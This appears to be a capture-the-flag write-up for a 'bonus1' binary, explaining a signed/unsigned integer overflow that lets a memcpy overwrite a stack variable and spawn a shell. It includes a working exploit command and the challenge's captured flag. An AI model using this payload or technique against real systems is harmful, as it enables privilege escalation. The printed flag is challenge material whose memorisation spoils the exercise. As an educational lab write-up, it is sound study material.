# 🎯 Bonus1 - Integer Overflow Exploitation

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

When integers attack - signed vs unsigned exploitation!

## 📋 Binary Analysis

### 🎯 Main Function (Decompiled)

```c
int main(int argc, char **argv)
{
	char buffer[40];    // Stack buffer at ESP+0x14
	int num;            // Signed integer at ESP+0x3c
	
	// Convert first argument to signed integer
	num = atoi(argv[1]);
	
	// ⚠️ VULNERABLE: Signed integer comparison
	if (num <= 9)
	{
		// ⚠️ CRITICAL: Integer overflow vulnerability!
		// - num is SIGNED (can be negative)
		// - num * 4 can overflow/wrap around
		// - memcpy expects size_t (UNSIGNED)
		memcpy(buffer, argv[2], num * 4);
		
		// Check if num equals magic value
		if (num == 0x574f4c46)    // "FLOW" in little-endian ASCII
		{
			execl("/bin/sh", "sh", 0);    // 🚩 Spawn shell!
		}
		return 0;
	}
	else
	{
		return 1;
	}
}
```

### 🔑 Key Addresses & Values

| Element | Value/Address | Notes |
|---------|---------------|-------|
| **buffer** | `ESP+0x14` | 40-byte stack buffer |
| **num** | `ESP+0x3c` | Signed integer variable |
| **Distance** | `0x28` (40 bytes) | From buffer start to num |
| **Magic value** | `0x574f4c46` | Required value for shell ("FLOW") |
| **Check limit** | `9` | Maximum allowed value (signed) |

## 🚨 Vulnerability

### The Problem: Type Confusion

The vulnerability lies in **mixing signed and unsigned integers**:

```c
int num = atoi(argv[1]);          // SIGNED integer

if (num <= 9) {                    // SIGNED comparison
    memcpy(buffer, argv[2], num * 4);  // size_t = UNSIGNED!
}
```

**What happens:**
1. `atoi()` returns a **signed int** (can be negative)
2. Check uses **signed comparison** (`num <= 9`)
3. `memcpy()` expects **size_t** (unsigned type)
4. When `num * 4` is passed to memcpy, it's **cast to unsigned**

**The same bit pattern means different things:**

```
Bit pattern: 0x8000000B

As signed int:   -2,147,483,637  ← Passes check (< 10)
As unsigned:      2,147,483,659  ← Huge positive number!
```

### Memory Layout

**Stack frame structure:**

```
ESP+0x00: [function arguments]
ESP+0x14: [buffer - 40 bytes]     ← memcpy destination
          |                    |
          | 40 bytes           |
          |                    |
ESP+0x3c: [num - 4 bytes]          ← Target to overwrite
ESP+0x40: [saved EBP]
ESP+0x44: [return address]
```

**Goal:** Overflow buffer to overwrite `num` with `0x574f4c46`

## 🎯 How the Exploit Works

### Step 1: Bypass the Check

```c
if (num <= 9)  // We need to pass this!
```

**Solution:** Use a negative number!
- Any negative number is less than 9 ✅
- Example: `-2147483637 < 9` → TRUE

### Step 2: Trigger Integer Overflow

```c
memcpy(buffer, argv[2], num * 4);
```

**The Math:**
```
num = -2147483637 (0x8000000B in signed int)

Multiply by 4:
  -2147483637 * 4 = -8589934548 (overflows 32-bit)

Cast to size_t (unsigned):
  Wraps to huge positive number!
  
Result: memcpy copies WAY more than 44 bytes!
```

**Why this works:**
- Multiplication overflows 32-bit signed range
- When cast to `size_t` (unsigned), wraps around to huge positive value
- `memcpy` copies massive amount of data → buffer overflow!

### Step 3: Overwrite the Variable

**Payload structure for argv[2]:**
```
[40 bytes padding][0x574f4c46]
 └─ Fills buffer  └─ Overwrites num
```

```
Before memcpy:
ESP+0x14: [buffer = empty]
ESP+0x3c: [num = -2147483637]

After memcpy:
ESP+0x14: [buffer = "AAAA...AAAA"]  (40 bytes)
ESP+0x3c: [num = 0x574f4c46]       (overwritten!)
```

### Step 4: Pass the Magic Check

```c
if (num == 0x574f4c46)  // Check after memcpy!
{
    execl("/bin/sh", "sh", 0);  // Victory!
}
```

Since we overwrote `num` with `0x574f4c46`, this check passes and spawns a shell!

### Key Insight

Bonus1 introduces **integer overflow** leading to buffer overflow. The pattern: **signed check → unsigned operation = vulnerability**. This is a classic example of how type mismatches create security vulnerabilities:

1. `atoi()` can return negative values
2. Negative multiplication wraps around when cast to unsigned
3. Size checks on signed values don't protect unsigned operations

## 💣 Execute the Exploit

### The Payload

```bash
./bonus1 -2147483637 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
```

**Breakdown:**
- **argv[1]:** `-2147483637`
  - Hex: `0x8000000B` (signed)
  - Passes check: `-2147483637 <= 9` ✅
  - Multiplied by 4: wraps to huge unsigned value
  
- **argv[2]:** `"A"*40 + "\x46\x4c\x4f\x57"`
  - 40 bytes padding (fills buffer)
  - `\x46\x4c\x4f\x57` = `0x574f4c46` (little-endian)

### Expected Output

```bash
$ ./bonus1 -2147483637 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

> 💡 **Pro Tip**: Always check for type confusion when signed and unsigned integers are mixed! Look for patterns like `signed check → unsigned operation`. Use `-fsanitize=integer` when compiling to catch integer overflows!

> ⚠️ **Security Note**: Modern defenses against integer overflows include [SafeInt](https://github.com/dcleblanc/SafeInt) (C++), compiler flags like `-fwrapv` and `-ftrapv`, and languages with checked arithmetic (Rust, Swift). Always validate arithmetic operations when dealing with untrusted input!

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
